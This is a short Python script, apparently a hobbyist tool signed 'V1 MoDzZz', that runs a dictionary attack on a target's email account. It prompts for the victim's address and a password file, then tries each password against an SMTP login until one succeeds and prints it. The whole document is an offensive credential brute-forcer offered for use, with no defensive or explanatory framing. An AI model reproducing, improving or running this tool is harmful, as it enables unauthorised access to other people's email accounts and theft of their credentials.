import smtplib


print('''
===================================================================
____   ____________________________ ____ _________________________
\   \ /   /_   \______   \______   \    |   \__    ___/\_   _____/
 \   Y   / |   ||    |  _/|       _/    |   / |    |    |    __)_ 
  \     /  |   ||    |   \|    |   \    |  /  |    |    |        \
   \___/   |___||______  /|____|_  /______/   |____|   /_______  /
                       \/        \/                            \/ 
===================================================================
''')

smtpserver = smtplib.SMTP("smtp.google.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print("connection successful")

print("made by V1 MoDzZz")

user = input("Enter the targets email address: ")

pwfile = input("what is your password file directory: ")
pwfile = open(pwfile, "r")


for password in pwfile:
    try:
        smtpserver.login(user, password)
        print("so the password is ", password)
        break;
        
    except smtplib.SMTPAuthenticationError:
        print(password, "is not the password")

